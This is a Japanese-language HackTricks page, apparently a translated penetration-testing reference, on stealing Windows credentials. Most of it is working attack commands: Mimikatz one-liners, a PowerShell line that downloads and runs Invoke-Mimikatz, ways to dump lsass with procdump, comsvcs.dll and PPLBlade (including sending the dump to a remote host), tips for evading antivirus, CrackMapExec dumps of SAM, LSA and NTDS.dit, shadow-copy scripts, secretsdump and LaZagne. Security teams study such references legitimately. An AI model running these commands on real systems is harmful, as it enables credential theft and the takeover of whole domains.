# Windows資格情報の盗み取り

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する
- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>

## 資格情報 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**[このページ](credentials-mimikatz.md)**でMimikatzができる他のことを見つける。 

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**こちらで可能な資格情報保護について学んでください。**](credentials-protections.md) **これらの保護は、Mimikatzが一部の資格情報を抽出するのを防ぐ可能性があります。**

## Meterpreterを使用した資格情報

被害者の中で**パスワードとハッシュを検索**するために、私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用します。**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV回避

### Procdump + Mimikatz

**SysInternals**の**Procdump**は[**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)からの合法的なMicrosoftツールなので、Defenderに検出されません。\
このツールを使用して**lsassプロセスをダンプ**し、**ダンプをダウンロード**して、**ダンプからローカルで資格情報を抽出**することができます。

{% code title="lsassをダンプ" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="ダンプから資格情報を抽出する" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

このプロセスは、[SprayKatz](https://github.com/aas-n/spraykatz)を使用して自動的に実行されます： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**: 一部の **AV** は **procdump.exe で lsass.exe をダンプする**ことを **悪意のあるもの**として **検出**する場合があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を **検出**しているためです。そのため、lsass.exe の **PID** を procdump に **引数**として **渡す**ことが **よりステルス**です。

### **comsvcs.dll** を使用して lsass をダンプする

`C:\Windows\System32` にある **comsvcs.dll** という名前の DLL は、クラッシュが発生した場合にプロセスメモリを **ダンプ**する責務を持っています。この DLL には、`rundll32.exe` を使用して呼び出される **`MiniDumpW`** という名前の **関数** が含まれています。\
最初の2つの引数を使用する必要はありませんが、3番目の引数は3つのコンポーネントに分割されます。ダンプするプロセスの **PID** が最初のコンポーネントを構成し、ダンプファイルの場所が2番目を表し、3番目のコンポーネントは厳密に **full** という単語です。代替オプションは存在しません。\
これらの3つのコンポーネントを解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをこのファイルに転送します。\
**comsvcs.dll** の利用は、lsass プロセスをダンプするために procdump をアップロードして実行する必要がなくなります。この方法について詳しくは、[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) で説明されています。

以下のコマンドが使用されます：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **タスクマネージャーを使用してlsassをダンプする**

1. タスクバーを右クリックし、タスクマネージャーをクリックします。
2. 「詳細」をクリックします。
3. プロセスタブで「Local Security Authority Process」プロセスを検索します。
4. 「Local Security Authority Process」プロセスを右クリックし、「ダンプファイルの作成」をクリックします。

### procdumpを使用してlsassをダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部であるMicrosoftによって署名されたバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBladeを使用してlsassをダンプする

[PPLBlade](https://github.com/tastypepperoni/PPLBlade)は、保護されたプロセスダンパーツールであり、メモリダンプを難読化し、それをディスクにドロップせずにリモートワークステーションに転送することをサポートしています。

**主な機能**:

1. PPL保護のバイパス
2. Defenderのシグネチャベースの検出メカニズムを回避するためにメモリダンプファイルを難読化する
3. ディスクにドロップせずにRAWおよびSMBアップロード方法でメモリダンプをアップロードする（ファイルレスダンプ）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### SAMハッシュのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSAシークレットのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲットDCからNTDS.ditをダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲットDCからNTDS.ditのパスワード履歴をダンプします
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各NTDS.ditアカウントのpwdLastSet属性を表示します
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEMの盗み出し

これらのファイルは_C:\windows\system32\config\SAM_と_C:\windows\system32\config\SYSTEM_に**配置されているはず**です。しかし、それらは保護されているため、通常の方法で単純にコピーすることはできません。

### レジストリから

これらのファイルを盗む最も簡単な方法は、レジストリからコピーすることです：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Kaliマシン**にそれらのファイルを**ダウンロード**し、次のコマンドを使用して**ハッシュを抽出**します：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### ボリュームシャドウコピー

このサービスを使用して、保護されたファイルのコピーを作成できます。管理者である必要があります。

#### vssadminを使用する

vssadminバイナリはWindows Serverバージョンのみで利用可能です。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、同じことを**Powershell**からも行うことができます。これは**SAMファイルをコピーする方法の例**です（使用されるハードドライブは"C:"で、C:\users\Publicに保存されます）。ただし、これは保護された任意のファイルをコピーするために使用できます。
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
コードは次の本から取得：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最後に、[**PSスクリプトInvoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使用して、SAM、SYSTEM、およびntds.ditのコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit**ファイルは、**Active Directory**の中心部であり、ユーザーオブジェクト、グループ、およびそれらのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの**パスワードハッシュ**が格納されています。このファイルは**Extensible Storage Engine (ESE)**データベースであり、**_%SystemRoom%/NTDS/ntds.dit_に存在します。

このデータベース内には、3つの主要なテーブルが保持されています:

- **Data Table**: このテーブルは、ユーザーやグループなどのオブジェクトの詳細を格納する役割を担っています。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの**セキュリティ記述子**がここに保持され、格納されたオブジェクトのセキュリティとアクセス制御を確保します。

これに関する詳細情報: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windowsは_Ntdsa.dll_を使用してそのファイルとやり取りし、_lsass.exe_によって使用されます。その後、**NTDS.dit**ファイルの**一部**が**`lsass`**メモリ内に存在する可能性があります（おそらく**キャッシュ**を使用してパフォーマンスが向上しているため、最新にアクセスされたデータを見つけることができます）。

#### NTDS.dit内のハッシュの復号化

ハッシュは3回暗号化されます:

1. **BOOTKEY**および**RC4**を使用して**パスワード暗号化キー（PEK）**を復号化します。
2. **PEK**および**RC4**を使用して**ハッシュ**を復号化します。
3. **DES**を使用して**ハッシュ**を復号化します。

**PEK**は**すべてのドメインコントローラーで同じ値**を持っていますが、**NTDS.dit**ファイル内で**ドメインコントローラーのSYSTEMファイルのBOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これは、NTDS.ditファイルから資格情報を取得するためには、NTDS.ditファイルとSYSTEMファイル（_C:\Windows\System32\config\SYSTEM_）が必要である理由です。

### Ntdsutilを使用してNTDS.ditをコピーする

Windows Server 2008以降で利用可能です。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
また、**ntds.dit**ファイルをコピーするために[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用することもできます。**SYSTEMファイル**のコピーも必要です（再び、レジストリからダンプするか、[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用してください）。

### **NTDS.ditからハッシュを抽出する**

**NTDS.dit**と**SYSTEM**ファイルを入手したら、_secretsdump.py_などのツールを使用して**ハッシュを抽出**できます。
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
あなたはまた、有効なドメイン管理者ユーザーを使用して、それらを自動的に**抽出する**こともできます：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大きなNTDS.ditファイル**の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使用して抽出することをお勧めします。

最後に、**metasploitモジュール**を使用することもできます: _post/windows/gather/credentials/domain\_hashdump_または**mimikatz** `lsadump::lsa /inject`

### **NTDS.ditからドメインオブジェクトをSQLiteデータベースに抽出する**

NTDSオブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使用してSQLiteデータベースに抽出できます。秘密情報だけでなく、生のNTDS.ditファイルがすでに取得されている場合に、さらなる情報抽出のためにオブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM`ハイブはオプションですが、シークレットの復号化（NTおよびLMハッシュ、クリアテキストパスワード、Kerberosまたは信頼キー、NTおよびLMパスワード履歴などの補足資格情報）を可能にします。他の情報と共に、次のデータが抽出されます：ユーザーとマシンアカウントとそれらのハッシュ、UACフラグ、最終ログオンおよびパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的メンバーシップ、組織単位ツリーとメンバーシップ、信頼されたドメインと信頼のタイプ、方向、属性...

## Lazagne

[ここ](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードしてください。このバイナリを使用して、複数のソフトウェアから資格情報を抽出できます。
```
lazagne.exe all
```
## SAM および LSASS から資格情報を抽出するためのその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから資格情報を抽出するために使用できます。[こちら](https://www.ampliasecurity.com/research/windows-credentials-editor/)からダウンロードしてください。

### fgdump

SAM ファイルから資格情報を抽出します。
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから資格情報を抽出します
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

[ここ](http://www.tarasco.org/security/pwdump\_7) からダウンロードし、単に**実行**するだけでパスワードが抽出されます。

## Defenses

[**こちらでいくつかの資格情報保護について学びましょう。**](credentials-protections.md)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>
